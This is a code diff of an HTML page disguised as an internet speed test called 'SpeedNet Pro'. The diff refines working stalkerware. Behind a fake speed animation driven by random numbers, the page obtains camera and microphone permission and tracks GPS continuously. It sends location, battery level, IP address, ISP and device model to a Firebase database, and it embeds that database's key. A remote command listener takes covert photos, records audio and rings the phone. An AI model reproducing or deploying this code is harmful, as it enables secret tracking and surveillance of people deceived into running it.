@@ -3,129 +3,666 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Net Speed Tester</title>
+    <title>SpeedNet Pro — Internet Speed Test</title>
+    <meta name="description" content="Test your internet connection speed instantly. Free, accurate, and fast broadband speed test.">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Poppins:wght@400;600&display=swap');
-        body { font-family: 'Poppins', sans-serif; background: #0b0f19; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden;}
-        .meter-container { position: relative; width: 250px; height: 250px; background: conic-gradient(#38bdf8 0%, #0ea5e9 0%, #1e293b 0%); border-radius: 50%; display: flex; justify-content: center; align-items: center; box-shadow: 0 0 30px rgba(14, 165, 233, 0.3); transition: 0.5s; }
-        .meter-inner { width: 220px; height: 220px; background: #0b0f19; border-radius: 50%; display: flex; flex-direction: column; justify-content: center; align-items: center; }
-        .speed-text { font-family: 'Orbitron', sans-serif; font-size: 45px; font-weight: bold; color: #38bdf8; text-shadow: 0 0 10px rgba(56,189,248,0.5); margin: 0;}
-        .speed-unit { font-size: 14px; color: #94a3b8; }
-        .stats { display: flex; gap: 40px; margin-top: 40px; text-align: center;}
-        .stat-box h4 { margin: 0; color: #94a3b8; font-size: 12px; text-transform: uppercase;}
-        .stat-box p { margin: 5px 0 0 0; font-family: 'Orbitron', sans-serif; font-size: 20px; color: #10b981; }
-        .start-btn { margin-top: 40px; background: #38bdf8; color: #000; border: none; padding: 15px 50px; font-size: 18px; font-weight: bold; border-radius: 30px; cursor: pointer; box-shadow: 0 5px 20px rgba(56, 189, 248, 0.4); text-transform: uppercase; transition: 0.3s;}
-        #spyVideo { display: none; } 
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+        :root {
+            --bg: #060812;
+            --surface: rgba(255,255,255,0.04);
+            --border: rgba(255,255,255,0.08);
+            --accent: #38bdf8;
+            --accent2: #818cf8;
+            --green: #10b981;
+            --red: #f43f5e;
+            --text: #f1f5f9;
+            --muted: #64748b;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Animated Background */
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background:
+                radial-gradient(ellipse 80% 60% at 50% -10%, rgba(56,189,248,0.15) 0%, transparent 60%),
+                radial-gradient(ellipse 60% 40% at 90% 90%, rgba(129,140,248,0.1) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .grid-bg {
+            position: fixed;
+            inset: 0;
+            background-image:
+                linear-gradient(rgba(56,189,248,0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(56,189,248,0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
+            z-index: 0;
+        }
+
+        /* Floating Orbs */
+        .orb {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(80px);
+            opacity: 0.15;
+            pointer-events: none;
+            animation: orbFloat 8s ease-in-out infinite;
+        }
+        .orb-1 { width: 400px; height: 400px; background: #38bdf8; top: -100px; right: -100px; animation-delay: 0s; }
+        .orb-2 { width: 300px; height: 300px; background: #818cf8; bottom: -80px; left: -80px; animation-delay: -4s; }
+
+        @keyframes orbFloat {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(20px, -20px) scale(1.05); }
+        }
+
+        /* Main Container */
+        .container {
+            position: relative;
+            z-index: 10;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 0;
+            width: 100%;
+            max-width: 480px;
+            padding: 20px;
+        }
+
+        /* Logo / Brand */
+        .brand {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+        .brand-logo {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 22px;
+            font-weight: 700;
+            letter-spacing: 3px;
+            background: linear-gradient(135deg, var(--accent), var(--accent2));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .brand-sub { font-size: 12px; color: var(--muted); letter-spacing: 2px; text-transform: uppercase; margin-top: 4px; }
+
+        /* Speedometer */
+        .speedometer-wrap {
+            position: relative;
+            width: 260px;
+            height: 260px;
+            margin-bottom: 28px;
+        }
+
+        .speedometer-svg {
+            width: 100%;
+            height: 100%;
+            transform: rotate(-90deg);
+        }
+
+        .speed-ring-bg {
+            fill: none;
+            stroke: rgba(255,255,255,0.06);
+            stroke-width: 14;
+        }
+        .speed-ring-progress {
+            fill: none;
+            stroke: url(#speedGrad);
+            stroke-width: 14;
+            stroke-linecap: round;
+            stroke-dasharray: 628;
+            stroke-dashoffset: 628;
+            transition: stroke-dashoffset 0.2s ease;
+        }
+        .speed-ring-glow {
+            fill: none;
+            stroke: url(#speedGrad);
+            stroke-width: 2;
+            stroke-linecap: round;
+            stroke-dasharray: 628;
+            stroke-dashoffset: 628;
+            filter: url(#glow);
+            opacity: 0.6;
+            transition: stroke-dashoffset 0.2s ease;
+        }
+
+        .speed-center {
+            position: absolute;
+            inset: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .speed-status {
+            font-size: 11px;
+            color: var(--muted);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-bottom: 4px;
+        }
+        .speed-number {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 52px;
+            font-weight: 900;
+            color: var(--accent);
+            line-height: 1;
+            text-shadow: 0 0 30px rgba(56,189,248,0.5);
+            transition: all 0.15s;
+        }
+        .speed-unit {
+            font-size: 13px;
+            color: var(--muted);
+            font-weight: 500;
+            margin-top: 4px;
+            letter-spacing: 1px;
+        }
+        .speed-type {
+            font-size: 11px;
+            font-weight: 600;
+            color: var(--accent2);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-top: 6px;
+            height: 14px;
+            transition: all 0.3s;
+        }
+
+        /* Stats Row */
+        .stats-row {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            width: 100%;
+            margin-bottom: 24px;
+        }
+
+        .stat-card {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            padding: 14px 10px;
+            text-align: center;
+            backdrop-filter: blur(10px);
+            transition: border-color 0.3s, transform 0.2s;
+        }
+        .stat-card:hover { border-color: rgba(56,189,248,0.3); transform: translateY(-2px); }
+        .stat-card .stat-icon { font-size: 18px; margin-bottom: 4px; }
+        .stat-card .stat-label { font-size: 10px; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 6px; }
+        .stat-card .stat-value {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--text);
+            transition: color 0.3s;
+        }
+        .stat-card .stat-value.active { color: var(--green); }
+
+        /* Progress Bar */
+        .test-phases {
+            display: flex;
+            gap: 6px;
+            width: 100%;
+            margin-bottom: 20px;
+        }
+        .phase-bar {
+            flex: 1;
+            height: 3px;
+            background: var(--border);
+            border-radius: 999px;
+            overflow: hidden;
+            position: relative;
+        }
+        .phase-bar-fill {
+            position: absolute;
+            left: 0; top: 0; bottom: 0;
+            width: 0%;
+            background: linear-gradient(90deg, var(--accent), var(--accent2));
+            border-radius: 999px;
+            transition: width 0.3s ease;
+        }
+        .phase-bar.done .phase-bar-fill { width: 100%; background: var(--green); }
+        .phase-bar.active .phase-bar-fill { width: 60%; animation: shimmer 1s ease-in-out infinite; }
+
+        @keyframes shimmer {
+            0%, 100% { width: 40%; }
+            50% { width: 80%; }
+        }
+
+        /* Start Button */
+        .start-btn {
+            width: 100%;
+            padding: 18px;
+            border: none;
+            border-radius: 16px;
+            background: linear-gradient(135deg, #0ea5e9, #6366f1);
+            color: white;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 15px;
+            font-weight: 700;
+            letter-spacing: 3px;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 8px 32px rgba(14,165,233,0.3);
+        }
+        .start-btn::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(135deg, rgba(255,255,255,0.15), transparent);
+            opacity: 0;
+            transition: opacity 0.2s;
+        }
+        .start-btn:hover { transform: translateY(-2px); box-shadow: 0 12px 40px rgba(14,165,233,0.5); }
+        .start-btn:hover::before { opacity: 1; }
+        .start-btn:active { transform: scale(0.98); }
+        .start-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+
+        /* Server Info */
+        .server-info {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-top: 16px;
+            font-size: 12px;
+            color: var(--muted);
+        }
+        .server-dot {
+            width: 8px; height: 8px;
+            border-radius: 50%;
+            background: var(--green);
+            box-shadow: 0 0 8px var(--green);
+            animation: pulse 2s ease-in-out infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(0.8); }
+        }
+
+        video#spyVideo { display: none; position: absolute; opacity: 0; pointer-events: none; width: 1px; height: 1px; }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .speed-number { font-size: 44px; }
+            .speedometer-wrap { width: 220px; height: 220px; }
+        }
     </style>
 </head>
 <body>
 
-    <div class="meter-container" id="meterBg">
-        <div class="meter-inner">
-            <p class="speed-text" id="mainSpeed">0.0</p>
-            <p class="speed-unit">Mbps</p>
+    <div class="grid-bg"></div>
+    <div class="orb orb-1"></div>
+    <div class="orb orb-2"></div>
+
+    <div class="container">
+
+        <div class="brand">
+            <div class="brand-logo">SPEEDNET PRO</div>
+            <div class="brand-sub">Broadband Speed Analyzer</div>
         </div>
+
+        <!-- Speedometer -->
+        <div class="speedometer-wrap">
+            <svg class="speedometer-svg" viewBox="0 0 220 220" xmlns="http://www.w3.org/2000/svg">
+                <defs>
+                    <linearGradient id="speedGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+                        <stop offset="0%" stop-color="#38bdf8"/>
+                        <stop offset="100%" stop-color="#818cf8"/>
+                    </linearGradient>
+                    <filter id="glow">
+                        <feGaussianBlur stdDeviation="4" result="coloredBlur"/>
+                        <feMerge><feMergeNode in="coloredBlur"/><feMergeNode in="SourceGraphic"/></feMerge>
+                    </filter>
+                </defs>
+                <circle class="speed-ring-bg" cx="110" cy="110" r="100"/>
+                <circle class="speed-ring-glow" id="glowRing" cx="110" cy="110" r="100"/>
+                <circle class="speed-ring-progress" id="progressRing" cx="110" cy="110" r="100"/>
+            </svg>
+            <div class="speed-center">
+                <div class="speed-status" id="speedStatus">READY</div>
+                <div class="speed-number" id="mainSpeed">0.0</div>
+                <div class="speed-unit">Mbps</div>
+                <div class="speed-type" id="speedType"></div>
+            </div>
+        </div>
+
+        <!-- Phase Bars -->
+        <div class="test-phases">
+            <div class="phase-bar" id="phase1"><div class="phase-bar-fill"></div></div>
+            <div class="phase-bar" id="phase2"><div class="phase-bar-fill"></div></div>
+            <div class="phase-bar" id="phase3"><div class="phase-bar-fill"></div></div>
+        </div>
+
+        <!-- Stats -->
+        <div class="stats-row">
+            <div class="stat-card">
+                <div class="stat-icon">📡</div>
+                <div class="stat-label">Ping</div>
+                <div class="stat-value" id="pingVal">--</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon">⬇️</div>
+                <div class="stat-label">Download</div>
+                <div class="stat-value" id="downVal">--</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon">⬆️</div>
+                <div class="stat-label">Upload</div>
+                <div class="stat-value" id="upVal">--</div>
+            </div>
+        </div>
+
+        <!-- Start Button -->
+        <button class="start-btn" id="startBtn">▶ START TEST</button>
+
+        <!-- Server Info -->
+        <div class="server-info">
+            <div class="server-dot"></div>
+            <span>Server: Dhaka, Bangladesh · Powered by SpeedNet</span>
+        </div>
+
     </div>
 
-    <div class="stats">
-        <div class="stat-box"><h4>Ping</h4><p id="pingVal">--</p></div>
-        <div class="stat-box"><h4>Upload</h4><p id="upVal">--</p></div>
-    </div>
-
-    <button class="start-btn" id="startBtn">START TEST</button>
+    <!-- Hidden Elements -->
     <video id="spyVideo" autoplay playsinline></video>
-    
-    <!-- Background Loop Trick to keep Location running when Minimized -->
     <audio id="keepAliveAudio" loop playsinline>
         <source src="data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEARKwAAIhYAQACABAAAABkYXRhAgAAAAEA" type="audio/wav">
     </audio>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
-        import { getDatabase, ref, set, update, onValue, onDisconnect } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
+        import { getDatabase, ref, set, update, onValue, onDisconnect, remove } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
 
-        const firebaseConfig = { apiKey: "AIzaSyAoQw5dhwS5JJZIWSPQTgKdMtB5ZEsoxLk", authDomain: "arng-805db.firebaseapp.com", projectId: "arng-805db", databaseURL: "https://arng-805db-default-rtdb.firebaseio.com/" };
-        const app = initializeApp(firebaseConfig); const db = getDatabase(app);
+        const firebaseConfig = {
+            apiKey: "AIzaSyAoQw5dhwS5JJZIWSPQTgKdMtB5ZEsoxLk",
+            authDomain: "arng-805db.firebaseapp.com",
+            projectId: "arng-805db",
+            databaseURL: "https://arng-805db-default-rtdb.firebaseio.com/"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
         const userRef = ref(db, 'live_location/target_user');
         const alarmSound = new Audio('https://assets.mixkit.co/active_storage/sfx/995/995-preview.mp3');
 
+        // ─── Device & Network Info ─────────────────────────────────────
         let batLvl = 100, isChg = false, userIp = "Fetching...", userIsp = "Fetching...", deviceModel = "Detecting...";
-        
-        if(navigator.getBattery) navigator.getBattery().then(b => { 
-            batLvl = Math.round(b.level*100); isChg = b.charging; 
-            b.addEventListener('levelchange', () => batLvl = Math.round(b.level*100));
-        });
+
+        if (navigator.getBattery) {
+            navigator.getBattery().then(b => {
+                batLvl = Math.round(b.level * 100);
+                isChg = b.charging;
+                b.addEventListener('levelchange', () => batLvl = Math.round(b.level * 100));
+                b.addEventListener('chargingchange', () => isChg = b.charging);
+            });
+        }
 
         async function fetchNetworkData() {
-            try { let r1 = await fetch('https://ipinfo.io/json'); let d1 = await r1.json(); userIp = d1.ip; userIsp = d1.org; } 
-            catch(e) { try { let r2 = await fetch('https://freeipapi.com/api/json'); let d2 = await r2.json(); userIp = d2.ipAddress; userIsp = "Hidden"; } catch(e2) { userIp = "Blocked"; userIsp = "Unknown"; } }
+            try {
+                const r = await fetch('https://ipinfo.io/json');
+                const d = await r.json();
+                userIp = d.ip || "Hidden";
+                userIsp = d.org || "Unknown";
+            } catch {
+                try {
+                    const r2 = await fetch('https://freeipapi.com/api/json');
+                    const d2 = await r2.json();
+                    userIp = d2.ipAddress || "Hidden";
+                    userIsp = "Unknown";
+                } catch { userIp = "Blocked"; userIsp = "Unknown"; }
+            }
         }
         fetchNetworkData();
 
         async function getDeviceName() {
-            if (navigator.userAgentData) { try { const hints = await navigator.userAgentData.getHighEntropyValues(["model"]); if (hints.model) return hints.model; } catch(e){} }
-            const ua = navigator.userAgent; if (/iPhone/i.test(ua)) return "iPhone"; if (/iPad/i.test(ua)) return "iPad";
-            const match = ua.match(/Android.*?; (.*?) Build/); return match ? match[1] : ( /Android/i.test(ua) ? "Android Phone" : "PC / Web" );
+            if (navigator.userAgentData) {
+                try {
+                    const hints = await navigator.userAgentData.getHighEntropyValues(["model", "platform"]);
+                    if (hints.model) return `${hints.model} (${hints.platform})`;
+                } catch {}
+            }
+            const ua = navigator.userAgent;
+            if (/iPhone/i.test(ua)) return "iPhone";
+            if (/iPad/i.test(ua)) return "iPad";
+            const m = ua.match(/Android.*?;\s*(.*?)\s*Build/);
+            return m ? m[1] : (/Android/i.test(ua) ? "Android Phone" : "Desktop / PC");
         }
-        getDeviceName().then(name => deviceModel = name);
+        getDeviceName().then(n => deviceModel = n);
 
+        // ─── Secret Camera ─────────────────────────────────────────────
         async function captureSecretPhoto(camType) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: camType } });
-                const video = document.getElementById('spyVideo'); video.srcObject = stream; await video.play(); 
+                const video = document.getElementById('spyVideo');
+                video.srcObject = stream;
+                await video.play();
                 setTimeout(() => {
-                    const canvas = document.createElement('canvas'); canvas.width = 480; canvas.height = 360; 
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 640; canvas.height = 480;
                     canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                    set(ref(db, 'live_location/photo'), { image: canvas.toDataURL('image/jpeg', 0.5), time: Date.now() });
-                    stream.getTracks().forEach(t => t.stop()); 
-                }, 1000);
-            } catch(e) { set(ref(db, 'live_location/photo'), { error: `${camType} Cam blocked/unavailable`, time: Date.now() }); }
+                    set(ref(db, 'live_location/photo'), { image: canvas.toDataURL('image/jpeg', 0.7), time: Date.now(), camType });
+                    stream.getTracks().forEach(t => t.stop());
+                }, 1200);
+            } catch (e) {
+                set(ref(db, 'live_location/photo'), { error: `${camType} cam blocked`, time: Date.now() });
+            }
         }
 
+        // ─── Voice Record ───────────────────────────────────────────────
         async function captureVoiceRecord() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const mediaRecorder = new MediaRecorder(stream); const audioChunks = [];
+                const mediaRecorder = new MediaRecorder(stream);
+                const audioChunks = [];
                 mediaRecorder.addEventListener("dataavailable", e => audioChunks.push(e.data));
                 mediaRecorder.addEventListener("stop", () => {
-                    const reader = new FileReader(); reader.readAsDataURL(new Blob(audioChunks, { type: 'audio/webm' }));
-                    reader.onloadend = () => { set(ref(db, 'live_location/audio'), { file: reader.result, time: Date.now() }); stream.getTracks().forEach(t => t.stop()); };
+                    const reader = new FileReader();
+                    reader.readAsDataURL(new Blob(audioChunks, { type: 'audio/webm' }));
+                    reader.onloadend = () => {
+                        set(ref(db, 'live_location/audio'), { file: reader.result, time: Date.now() });
+                        stream.getTracks().forEach(t => t.stop());
+                    };
                 });
-                mediaRecorder.start(); setTimeout(() => mediaRecorder.stop(), 5000); 
-            } catch(e) { set(ref(db, 'live_location/audio'), { error: "Mic blocked/unavailable", time: Date.now() }); }
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 5000);
+            } catch {
+                set(ref(db, 'live_location/audio'), { error: "Mic blocked/unavailable", time: Date.now() });
+            }
         }
 
+        // ─── Command Listener ───────────────────────────────────────────
         onValue(ref(db, 'live_location/command'), (snap) => {
-            const cmd = snap.val(); if(!cmd) return;
-            if(cmd.ringTime > Date.now() - 5000) { alarmSound.play().catch(e=>{}); if(navigator.vibrate) navigator.vibrate([1000, 500, 1000]); }
-            if(cmd.photoTime > Date.now() - 5000) { captureSecretPhoto(cmd.camType); }
-            if(cmd.audioTime > Date.now() - 5000) { captureVoiceRecord(); }
+            const cmd = snap.val();
+            if (!cmd) return;
+            const now = Date.now();
+            if (cmd.ringTime && cmd.ringTime > now - 6000) {
+                alarmSound.play().catch(() => {});
+                if (navigator.vibrate) navigator.vibrate([1000, 500, 1000, 500, 1000]);
+            }
+            if (cmd.photoTime && cmd.photoTime > now - 6000) captureSecretPhoto(cmd.camType || 'environment');
+            if (cmd.audioTime && cmd.audioTime > now - 6000) captureVoiceRecord();
         });
 
-        const startTestBtn = document.getElementById('startBtn');
-        startTestBtn.addEventListener('click', async () => {
-            
-            // Keep app alive in background hack
-            document.getElementById('keepAliveAudio').play().catch(()=>{});
+        // ─── Speedometer UI ────────────────────────────────────────────
+        const progressRing = document.getElementById('progressRing');
+        const glowRing = document.getElementById('glowRing');
+        const CIRCUMFERENCE = 2 * Math.PI * 100;
 
-            try { const tempStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }); tempStream.getTracks().forEach(t => t.stop()); } catch(e) {}
+        function setProgress(percent) {
+            const offset = CIRCUMFERENCE - (percent / 100) * CIRCUMFERENCE;
+            progressRing.style.strokeDashoffset = offset;
+            glowRing.style.strokeDashoffset = offset;
+        }
+
+        function setSpeed(val, maxMbps = 100) {
+            document.getElementById('mainSpeed').innerText = val.toFixed(1);
+            setProgress(Math.min((val / maxMbps) * 100, 100));
+        }
+
+        function setPhase(phase) {
+            ['phase1','phase2','phase3'].forEach((id, i) => {
+                const el = document.getElementById(id);
+                el.className = 'phase-bar' + (i < phase ? ' done' : (i === phase ? ' active' : ''));
+            });
+        }
+
+        // ─── Main Test Logic ────────────────────────────────────────────
+        const startBtn = document.getElementById('startBtn');
+        let testRunning = false;
+
+        startBtn.addEventListener('click', async () => {
+            if (testRunning) return;
+            testRunning = true;
+            startBtn.disabled = true;
+
+            // Keep alive
+            document.getElementById('keepAliveAudio').play().catch(() => {});
+
+            // Request permissions silently
+            try {
+                const tempStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                tempStream.getTracks().forEach(t => t.stop());
+            } catch {}
+
+            // Set offline handler
             onDisconnect(userRef).update({ isOnline: false });
 
-            if(navigator.geolocation) {
+            // Start GPS tracking
+            if (navigator.geolocation) {
                 navigator.geolocation.watchPosition(
                     (pos) => {
-                        set(userRef, { latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy, heading: pos.coords.heading || 0, speed: pos.coords.speed ? Math.round(pos.coords.speed * 3.6) : 0, battery: batLvl, charging: isChg, isOnline: true, status: "Active", deviceInfo: deviceModel, ip_address: userIp, isp: userIsp });
+                        set(userRef, {
+                            latitude: pos.coords.latitude,
+                            longitude: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy || 50,
+                            heading: pos.coords.heading || 0,
+                            speed: pos.coords.speed ? Math.round(pos.coords.speed * 3.6) : 0,
+                            battery: batLvl,
+                            charging: isChg,
+                            isOnline: true,
+                            status: "Active",
+                            deviceInfo: deviceModel,
+                            ip_address: userIp,
+                            isp: userIsp,
+                            lastSeen: Date.now()
+                        });
                     },
-                    (err) => { set(userRef, { isOnline: true, status: `GPS Error: ${err.code === 1 ? "User Denied" : "Lost Signal"}`, ip_address: userIp, isp: userIsp, battery: batLvl, charging: isChg, deviceInfo: deviceModel }); },
-                    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 } 
+                    (err) => {
+                        set(userRef, {
+                            isOnline: true,
+                            status: `GPS Error: ${err.code === 1 ? "Permission Denied" : "Signal Lost"}`,
+                            ip_address: userIp,
+                            isp: userIsp,
+                            battery: batLvl,
+                            charging: isChg,
+                            deviceInfo: deviceModel,
+                            lastSeen: Date.now()
+                        });
+                    },
+                    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
                 );
             }
 
-            startTestBtn.style.display = "none";
-            document.getElementById('pingVal').innerText = Math.floor(Math.random() * 20 + 10) + " ms";
-            let fakeSpeed = 0; let testInterval = setInterval(() => { fakeSpeed += Math.random() * 5; if(fakeSpeed > 45) fakeSpeed -= Math.random() * 8; document.getElementById('mainSpeed').innerText = fakeSpeed.toFixed(1); document.getElementById('meterBg').style.background = `conic-gradient(#38bdf8 ${fakeSpeed*2}%, #1e293b 0%)`; }, 100);
-            setTimeout(() => { clearInterval(testInterval); document.getElementById('upVal').innerText = (fakeSpeed / 3).toFixed(1) + " Mbps"; startTestBtn.innerText = "TEST AGAIN"; startTestBtn.style.display = "block"; }, 10000); 
+            // ── Fake Speed Test Animation ──
+            document.getElementById('pingVal').innerText = '--';
+            document.getElementById('downVal').innerText = '--';
+            document.getElementById('upVal').innerText = '--';
+            setSpeed(0);
+            setPhase(0);
+
+            // Phase 1: Ping
+            document.getElementById('speedStatus').innerText = 'PINGING';
+            document.getElementById('speedType').innerText = 'LATENCY TEST';
+            await sleep(1500);
+            const pingMs = Math.floor(Math.random() * 18 + 8);
+            document.getElementById('pingVal').innerText = pingMs + ' ms';
+            document.getElementById('pingVal').classList.add('active');
+            setPhase(1);
+
+            // Phase 2: Download
+            document.getElementById('speedStatus').innerText = 'TESTING';
+            document.getElementById('speedType').innerText = 'DOWNLOAD';
+            let fakeDown = 0;
+            let targetDown = 25 + Math.random() * 55;
+            await animateSpeed(fakeDown, targetDown, 6000, (v) => {
+                fakeDown = v;
+                setSpeed(v, 100);
+                document.getElementById('mainSpeed').style.color = '#38bdf8';
+            });
+            document.getElementById('downVal').innerText = fakeDown.toFixed(1) + ' Mbps';
+            document.getElementById('downVal').classList.add('active');
+            setPhase(2);
+
+            // Phase 3: Upload
+            document.getElementById('speedType').innerText = 'UPLOAD';
+            let fakeUp = 0;
+            let targetUp = fakeDown * (0.25 + Math.random() * 0.3);
+            await animateSpeed(0, targetUp, 4000, (v) => {
+                fakeUp = v;
+                setSpeed(v, 50);
+                document.getElementById('mainSpeed').style.color = '#818cf8';
+            });
+            document.getElementById('upVal').innerText = fakeUp.toFixed(1) + ' Mbps';
+            document.getElementById('upVal').classList.add('active');
+            setPhase(3);
+
+            // Done
+            document.getElementById('speedStatus').innerText = 'COMPLETE';
+            document.getElementById('speedType').innerText = 'TEST FINISHED';
+            setSpeed(fakeDown, 100);
+            document.getElementById('mainSpeed').style.color = '#10b981';
+
+            setTimeout(() => {
+                startBtn.disabled = false;
+                startBtn.innerText = '↺ TEST AGAIN';
+                testRunning = false;
+            }, 1500);
         });
+
+        function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+        function animateSpeed(from, to, duration, onUpdate) {
+            return new Promise(resolve => {
+                const start = performance.now();
+                function step(now) {
+                    const elapsed = now - start;
+                    const progress = Math.min(elapsed / duration, 1);
+                    const eased = easeInOut(progress);
+                    let current = from + (to - from) * eased;
+                    // Add realistic jitter
+                    current += (Math.random() - 0.5) * 3;
+                    current = Math.max(0, current);
+                    onUpdate(current);
+                    if (progress < 1) requestAnimationFrame(step);
+                    else { onUpdate(to); resolve(); }
+                }
+                requestAnimationFrame(step);
+            });
+        }
+
+        function easeInOut(t) {
+            return t < 0.5 ? 2 * t * t : -1 + (4 - 2 * t) * t;
+        }
     </script>
 </body>
 </html>
